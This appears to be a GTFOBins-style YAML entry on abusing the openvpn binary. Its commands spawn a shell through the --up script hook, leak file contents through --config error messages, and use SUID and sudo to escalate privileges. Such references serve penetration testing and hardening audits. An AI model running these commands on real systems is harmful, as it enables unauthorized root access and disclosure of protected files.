---
functions:
  shell:
    - code: |
        openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
  file-read:
    - description: The file is actually parsed and the first partial wrong line is returned in an error message.
      code: |
        LFILE=file_to_read
        openvpn --config "$LFILE"
  suid:
    - code: |
        ./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
    - description: The file is actually parsed and the first partial wrong line is returned in an error message.
      code: |
        LFILE=file_to_read
        ./openvpn --config "$LFILE"
  sudo:
    - code: |
        sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
    - description: The file is actually parsed and the first partial wrong line is returned in an error message.
      code: |
        LFILE=file_to_read
        sudo openvpn --config "$LFILE"
---
